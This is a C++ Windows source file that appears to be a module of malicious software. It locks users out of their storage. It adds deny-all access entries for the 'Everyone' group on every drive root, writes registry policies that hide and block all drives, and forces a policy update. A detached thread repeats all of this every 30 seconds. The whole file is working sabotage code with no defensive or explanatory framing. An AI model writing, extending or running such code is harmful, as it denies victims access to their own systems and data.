#include <windows.h>
#include <aclapi.h>
#include <string>
#include <vector>
#include <filesystem>
#include <thread>

namespace fs = std::filesystem;

void BlockDriveAccess(const std::string& drivePath) {
    try {
        PACL pDacl = NULL;
        PSECURITY_DESCRIPTOR pSecurityDescriptor = NULL;
        DWORD dwError = GetNamedSecurityInfoA(
            drivePath.c_str(),
            SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION,
            NULL, NULL, &pDacl, NULL, &pSecurityDescriptor
        );

        if (dwError != ERROR_SUCCESS) return;

        EXPLICIT_ACCESSA ea[1];
        ZeroMemory(&ea, sizeof(ea));

        ea[0].grfAccessPermissions = GENERIC_ALL;
        ea[0].grfAccessMode = DENY_ACCESS;
        ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
        ea[0].Trustee.TrusteeForm = TRUSTEE_IS_NAME;
        ea[0].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
        ea[0].Trustee.ptstrName = const_cast<char*>("Everyone");

        PACL pNewDacl = NULL;
        dwError = SetEntriesInAclA(1, ea, pDacl, &pNewDacl);
        if (dwError != ERROR_SUCCESS) {
            LocalFree(pSecurityDescriptor);
            return;
        }

        dwError = SetNamedSecurityInfoA(
            const_cast<char*>(drivePath.c_str()),
            SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION,
            NULL, NULL, pNewDacl, NULL
        );

        LocalFree(pSecurityDescriptor);
        LocalFree(pNewDacl);
    } catch (...) {}
}

void HideDrivesFromExplorer() {
    HKEY hKey;
    DWORD value = 0x00000000;
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "NoDrives", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegSetValueExA(hKey, "NoViewOnDrive", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }
}

void DenyDiskAccess() {
    for (char drive = 'A'; drive <= 'Z'; drive++) {
        std::string drivePath = std::string(1, drive) + ":\\";
        if (fs::exists(drivePath) && fs::is_directory(drivePath)) {
            BlockDriveAccess(drivePath);
        }
    }

    HideDrivesFromExplorer();

    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDrives /t REG_DWORD /d 0xFFFFFFFF /f");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoViewOnDrive /t REG_DWORD /d 0xFFFFFFFF /f");
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDrives /t REG_DWORD /d 0xFFFFFFFF /f");
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoViewOnDrive /t REG_DWORD /d 0xFFFFFFFF /f");
    system("gpupdate /force");
}

void InitializeDiskBlockModule() {
    std::thread diskThread([]() {
        Sleep(5000);
        while (true) {
            DenyDiskAccess();
            Sleep(30000);
        }
    });
    diskThread.detach();
}
